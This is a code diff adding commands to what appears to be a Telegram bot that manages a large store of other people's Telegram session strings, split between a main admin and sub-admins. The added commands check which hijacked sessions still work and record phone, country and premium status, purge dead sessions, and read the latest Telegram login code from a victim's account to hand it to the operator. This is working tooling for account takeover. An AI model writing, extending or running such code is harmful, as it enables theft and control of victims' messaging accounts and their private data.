@@ -255,6 +255,138 @@ async def cmd_logout_other_sessions(message: types.Message):
         f"• Failed to logout: {fail_count} sessions"
     )
 
+
+@dp.message_handler(commands=['log'])
+async def cmd_log(message: types.Message):
+    if is_main_admin(message.from_user.id):
+        sessions = list(sessions_col.find({}))
+        col_name = "MAIN"
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": message.from_user.id}))
+        col_name = f"LIGHT ADMIN {message.from_user.id}"
+    
+    if not sessions:
+        await message.answer("❌ No sessions found.")
+        return
+
+    total = len(sessions)
+    progress_msg = await message.answer(f"🔍 Checking {col_name} sessions (0/{total})...")
+    
+    valid = 0
+    invalid = 0
+    errors = 0
+    results = []
+    
+    for i, session in enumerate(sessions, 1):
+        phone = session.get("phone")
+        session_str = session.get("session")
+        
+        try:
+            client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+            await client.connect()
+            
+            if not await client.is_user_authorized():
+                results.append(f"❌ {phone} — Invalid session")
+                invalid += 1
+            else:
+                me = await client.get_me()
+                country = geocoder.description_for_number(parse(phone, None), "en")
+                premium = getattr(me, 'premium', False)
+                blocked = bool(getattr(me, 'restriction_reason', []))
+                
+                results.append(f"✅ {phone} | {country} | Premium: {'⭐️' if premium else '✖️'} | Blocked: {'🔴' if blocked else '🟢'}")
+                valid += 1
+                
+        except Exception as e:
+            results.append(f"❌ {phone} — Error: {str(e)[:50]}...")
+            errors += 1
+            
+        finally:
+            if 'client' in locals():
+                await client.disconnect()
+        
+        # Обновляем прогресс каждые 5 сессий или на последней
+        if i % 5 == 0 or i == total:
+            await bot.edit_message_text(
+                f"🔍 Checking {col_name} sessions ({i}/{total})...\n"
+                f"✅ Valid: {valid} | ❌ Invalid: {invalid} | ⚠️ Errors: {errors}",
+                chat_id=message.chat.id,
+                message_id=progress_msg.message_id
+            )
+
+    # Формируем финальный отчет
+    stats = (
+        f"\n📊 FINAL STATS:\n"
+        f"Total sessions: {total}\n"
+        f"✅ Valid: {valid} ({round(valid/total*100)}%)\n"
+        f"❌ Invalid: {invalid} ({round(invalid/total*100)}%)\n"
+        f"⚠️ Errors: {errors} ({round(errors/total*100)}%)"
+    )
+    
+    # Отправляем результаты частями
+    for chunk in [results[i:i+20] for i in range(0, len(results), 20)]:
+        await message.answer("\n".join(chunk))
+    
+    await message.answer(stats)
+    await bot.delete_message(chat_id=message.chat.id, message_id=progress_msg.message_id)
+
+
+@dp.message_handler(commands=['validel'])
+async def cmd_validel(message: types.Message):
+    if not is_main_admin(message.from_user.id):
+        return
+
+    sessions = list(sessions_col.find({}))
+    deleted = 0
+    for session in sessions:
+        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+        try:
+            await client.connect()
+            if not await client.is_user_authorized():
+                sessions_col.delete_one({"_id": session["_id"]})
+                deleted += 1
+        except:
+            sessions_col.delete_one({"_id": session["_id"]})
+            deleted += 1
+        finally:
+            await client.disconnect()
+
+    await message.answer(f"🧹 Invalid sessions removed: {deleted}")
+
+@dp.message_handler(commands=['login'])
+async def cmd_login(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    args = message.get_args().strip()
+    if not args.startswith('+'):
+        await message.reply("❗️ Use format: /login +1234567890")
+        return
+
+    if is_main_admin(message.from_user.id):
+        session = sessions_col.find_one({"phone": args})
+    else:
+        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
+    
+    if not session:
+        await message.reply("❌ Session not found.")
+        return
+
+    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+    try:
+        await client.connect()
+        history = await client(GetHistoryRequest(peer=777000, limit=1, offset_date=None,
+                                             offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
+        if history.messages:
+            await message.reply(f"📨 Last Telegram code:\n\n`{history.messages[0].message}`", parse_mode="Markdown")
+        else:
+            await message.reply("⚠️ No messages from Telegram.")
+    except Exception as e:
+        await message.reply(f"❌ Error: {e}")
+    finally:
+        await client.disconnect()
+
+
 async def export_sessions(user_id):
     """Export all sessions in required format"""
     if is_main_admin(user_id):
